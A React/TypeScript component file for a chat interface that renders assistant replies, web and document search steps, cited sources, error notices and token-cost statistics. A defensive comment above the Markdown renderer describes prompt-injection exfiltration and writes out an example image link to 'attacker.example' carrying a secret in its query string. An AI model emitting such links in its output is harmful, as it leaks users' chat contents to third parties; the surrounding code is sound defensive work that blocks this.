import { useState, type ReactNode } from "react";
import Markdown from "react-markdown";
import "katex/dist/katex.min.css";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import { formatMoney, formatMs } from "./format";
import { CheckIcon, ChevronIcon, CopyIcon, FileIcon, GlobeIcon } from "./Icons";
import { normalizeMath } from "./math";
import { describeRate, useRateInfo, useUsdToInr } from "./rate";
import { linkCitations } from "./cite";
import type { Message as MessageModel, Source } from "./types";

/** A message plus UI-only state that is not stored in the database. */
export interface ViewMessage extends MessageModel {
  /** Safe error text the server sent in an SSE `error` event (this session only). */
  errorMessage?: string;
  /** Live web-search activity of this reply (this session only; the sources themselves are stored). */
  toolSteps?: ToolStep[];
}

export interface ToolStep {
  id: string;
  name: string; // web_search | search_documents
  query: string | null;
  status: "running" | "done" | "error";
  count?: number;
  error?: string | null;
}

export default function Message({ message }: { message: ViewMessage }) {
  const isAssistant = message.role === "assistant";
  const isStreaming = message.status === "streaming";

  return (
    <article className={`msg msg-${message.role} status-${message.status}`}>
      {isAssistant && message.toolSteps && message.toolSteps.length > 0 && <ToolSteps steps={message.toolSteps} />}

      <div className="msg-body">
        {isStreaming && message.content === "" && !message.toolSteps?.some((t) => t.status === "running") ? (
          // Loading state: request sent, no token has arrived yet.
          <span className="thinking" aria-live="polite">
            <i /> <i /> <i />
            <span className="sr-only">Thinking</span>
          </span>
        ) : isStreaming || !isAssistant ? (
          // While streaming we show PLAIN TEXT (pre-wrap keeps newlines).
          // Why not render Markdown on every delta? A half-received document is
          // often invalid Markdown: an opening ``` fence with no closing fence
          // swallows everything after it as "code"; "**bo" has no closing
          // marker; a table is cut mid-row. Re-parsing on every token makes the
          // layout jump and flicker as constructs open and close. We render
          // Markdown once, when the text is final. (User text is also shown
          // plain: people don't expect their own message to be reformatted.)
          <div className="plain">{message.content}</div>
        ) : (
          <SafeMarkdown text={message.content} sources={message.sources} />
        )}
      </div>

      {isAssistant && message.sources.length > 0 && <Sources sources={message.sources} />}

      {isAssistant && <Notices message={message} />}
      {isAssistant && !isStreaming && (
        <div className="msg-foot">
          {message.content !== "" && <CopyButton text={message.content} label="Copy reply" />}
          <Stats message={message} />
        </div>
      )}
    </article>
  );
}

function CopyButton({ text, label, className = "" }: { text: string; label: string; className?: string }) {
  const [copied, setCopied] = useState(false);
  async function copy() {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1500);
    } catch {
      // Clipboard can be blocked (insecure origin, permissions); nothing useful to show.
    }
  }
  return (
    <button type="button" className={`icon-btn ${className}`} onClick={() => void copy()} title={label} aria-label={label}>
      {copied ? <CheckIcon /> : <CopyIcon />}
      <span>{copied ? "Copied" : "Copy"}</span>
    </button>
  );
}

/** Plain text of a hast node (react-markdown's syntax tree), used for "copy code". */
type HastNode = { type: string; value?: string; children?: HastNode[]; properties?: { className?: string[] } };
const hastText = (n: HastNode): string => (n.type === "text" ? (n.value ?? "") : (n.children ?? []).map(hastText).join(""));

function CodeBlock({ node, children }: { node?: HastNode; children?: ReactNode }) {
  const code = node?.children?.[0];
  const lang = code?.properties?.className?.find((c) => c.startsWith("language-"))?.slice(9);
  return (
    <div className="codeblock">
      <div className="codeblock-bar">
        <span>{lang ?? "text"}</span>
        <CopyButton text={code ? hastText(code).replace(/\n$/, "") : ""} label="Copy code" />
      </div>
      <pre>{children}</pre>
    </div>
  );
}

/**
 * LLM output is UNTRUSTED input. It can be influenced by whatever the model
 * read (including a malicious user or pasted document - prompt injection), so we
 * treat it like user-generated content:
 *
 *  - react-markdown builds React elements; it never uses dangerouslySetInnerHTML.
 *    Raw HTML in the Markdown (<script>, <img onerror=...>) is shown as inert
 *    text, because we do NOT enable rehype-raw.
 *  - Its default URL transform strips dangerous link schemes like javascript:.
 *  - Syntax highlighting (rehype-highlight) only wraps code text in <span class> elements;
 *    it never emits raw HTML.
 *  - Images are removed. A rendered ![](https://attacker.example/?q=<secret>)
 *    makes the BROWSER send a request to the attacker, a known way to exfiltrate
 *    chat contents via prompt injection.
 *  - Links open in a new tab with rel=noopener noreferrer.
 */
function SafeMarkdown({ text, sources }: { text: string; sources: Source[] }) {
  return (
    <Markdown
      // singleDollarTextMath off: "costs $5 and $6" must stay text. Math arrives as \( \) / \[ \],
      // which normalizeMath() rewrites to $$ ... $$ before parsing.
      remarkPlugins={[remarkGfm, [remarkMath, { singleDollarTextMath: false }]]}
      rehypePlugins={[[rehypeKatex, { throwOnError: false }], [rehypeHighlight, { detect: false }]]}
      disallowedElements={["img"]}
      components={{
        a: ({ node: _node, href, children, ...props }) => {
          // [n] markers were rewritten to #cite-n by linkCitations: show a chip that opens the real source.
          const cited = href?.startsWith("#cite-") ? sources.find((s) => s.n === Number(href.slice(6))) : undefined;
          if (cited && cited.kind === "document") {
            // A passage from an attached file has no address to open: the chip names it, the Sources list shows the text.
            return (
              <span className="cite cite-doc" title={`${cited.title}${cited.page ? `, page ${cited.page}` : ""}`}>
                {children}
              </span>
            );
          }
          if (cited) {
            return (
              <a className="cite" href={safeUrl(cited.url)} target="_blank" rel="noopener noreferrer" title={`${cited.title}, ${hostOf(cited.url)}`}>
                {children}
              </a>
            );
          }
          return <a {...props} href={href} target="_blank" rel="noopener noreferrer">{children}</a>;
        },
        pre: ({ node, children }) => <CodeBlock node={node as HastNode | undefined}>{children}</CodeBlock>,
      }}
    >
      {linkCitations(normalizeMath(text), sources.length)}
    </Markdown>
  );
}

const hostOf = (url: string) => {
  try {
    return new URL(url).hostname.replace(/^www\./, "");
  } catch {
    return url;
  }
};

/** Only http(s) URLs become links (the server also filters, but the UI doesn't rely on that). */
const safeUrl = (url: string) => (/^https?:\/\//i.test(url) ? url : undefined);

/** "Searching ..." rows: live while the model works, a summary afterwards. */
function ToolSteps({ steps }: { steps: ToolStep[] }) {
  return (
    <div className="tool-steps" aria-live="polite">
      {steps.map((t) => {
        const docs = t.name === "search_documents";
        const where = docs ? "your documents" : "the web";
        const unit = docs ? (t.count === 1 ? "passage" : "passages") : t.count === 1 ? "source" : "sources";
        return (
          <div key={t.id} className={`tool-step tool-${t.status}`}>
            {docs ? <FileIcon /> : <GlobeIcon />}
            {t.status === "running" ? (
              <span>
                Searching {where}
                {t.query ? <> for “{t.query}”</> : ""}
                <i className="dots" />
              </span>
            ) : t.status === "error" ? (
              <span>Search failed: {t.error}</span>
            ) : (
              <span>
                Searched {where}
                {t.query ? <> for “{t.query}”</> : ""} · {t.count} {unit}
              </span>
            )}
          </div>
        );
      })}
    </div>
  );
}

function Sources({ sources }: { sources: Source[] }) {
  // Open by default; a long search can collect many sources, so the user can fold them away.
  const [open, setOpen] = useState(true);
  const [shown, setShown] = useState<number | null>(null); // the document passage whose text is expanded
  return (
    <div className={`sources ${open ? "open" : ""}`}>
      <button type="button" className="sources-toggle" aria-expanded={open} onClick={() => setOpen((o) => !o)}>
        <ChevronIcon />
        <span>
          Sources <b>{sources.length}</b>
        </span>
      </button>
      {open && (
        <ol>
          {sources.map((s) => (
            <li key={s.n} className={s.kind === "document" && shown === s.n ? "expanded" : ""}>
              {s.kind === "document" ? (
                <button
                  type="button"
                  className="src-card src-doc"
                  aria-expanded={shown === s.n}
                  onClick={() => setShown((cur) => (cur === s.n ? null : s.n))}
                  title="Show the passage the answer used"
                >
                  <span className="src-n">{s.n}</span>
                  <span className="src-title">{s.title}</span>
                  <span className="src-host">{s.page ? `Page ${s.page}` : "Your document"}</span>
                  {shown === s.n && <span className="src-snippet">{s.snippet}</span>}
                </button>
              ) : (
                <a className="src-card" href={safeUrl(s.url)} target="_blank" rel="noopener noreferrer" title={s.snippet || s.title}>
                  <span className="src-n">{s.n}</span>
                  <span className="src-title">{s.title}</span>
                  <span className="src-host">{hostOf(s.url)}</span>
                </a>
              )}
            </li>
          ))}
        </ol>
      )}
    </div>
  );
}

function Notices({ message }: { message: ViewMessage }) {
  const hasText = message.content !== "";
  if (message.status === "error") {
    return (
      <div className="notice notice-error" role="alert">
        <strong>{message.errorMessage ?? "This response was interrupted."}</strong>{" "}
        {hasText ? "The partial response above was saved." : "No text was received."}
      </div>
    );
  }
  if (message.status === "cancelled") {
    return (
      <div className="notice notice-info">
        Stopped.{hasText ? " Showing the partial response." : " Nothing was generated."}
      </div>
    );
  }
  if (message.status === "complete" && message.stop_reason === "max_output_tokens") {
    return (
      <div className="notice notice-warn">
        Response was cut off because it reached the output limit.
      </div>
    );
  }
  if (message.status === "complete" && message.stop_reason === "content_filter") {
    return <div className="notice notice-warn">The response was stopped by a content filter.</div>;
  }
  return null;
}

const n = (v: number | null) => (v ?? 0).toLocaleString();

/**
 * Per-reply usage, exactly as the provider reported it. If it reported none (a
 * cancelled or failed reply), say so instead of showing made-up numbers.
 */
function Stats({ message }: { message: ViewMessage }) {
  const rate = useUsdToInr();
  const rateInfo = useRateInfo();
  const hasUsage = message.total_tokens !== null;
  return (
    <div className="stats">
      {hasUsage ? (
        <>
          <span title="Tokens sent to the model: instructions + conversation history + your message">
            <b>{n(message.input_tokens)}</b> input tokens
            {message.cached_input_tokens ? ` (${n(message.cached_input_tokens)} cached)` : ""}
          </span>
          <span title="Tokens the model generated for this reply">
            <b>{n(message.output_tokens)}</b> output tokens
            {message.reasoning_tokens ? ` (${n(message.reasoning_tokens)} reasoning)` : ""}
          </span>
          <span title={`USD calculated from the reported usage and AI/data/prices.toml. ${describeRate(rateInfo)}`}>
            <b>{formatMoney(message.cost_usd, rate)}</b>
          </span>
          {message.cache_savings_usd ? (
            <span className="saved" title="What the prompt cache saved on this reply: cached tokens at the normal input rate minus what they cost">
              saved <b>{formatMoney(message.cache_savings_usd, rate)}</b>
            </span>
          ) : null}
          {message.web_searches ? (
            <span title="Web searches the model ran for this reply">
              <b>{message.web_searches}</b> web {message.web_searches === 1 ? "search" : "searches"}
            </span>
          ) : null}
        </>
      ) : (
        <span title="OpenAI reported no usage for this reply (for example it was stopped or failed before finishing)">
          usage unavailable
        </span>
      )}
      {message.ttft_ms !== null && (
        <span title="Time to first token: how long until the first text appeared">TTFT {formatMs(message.ttft_ms)}</span>
      )}
      {message.latency_ms !== null && <span title="Total time for the reply">{formatMs(message.latency_ms)}</span>}
      {message.served_model && (
        <span title={message.model && message.model !== message.served_model ? `requested: ${message.model}` : "model that served this reply"}>
          {message.served_model}
        </span>
      )}
    </div>
  );
}
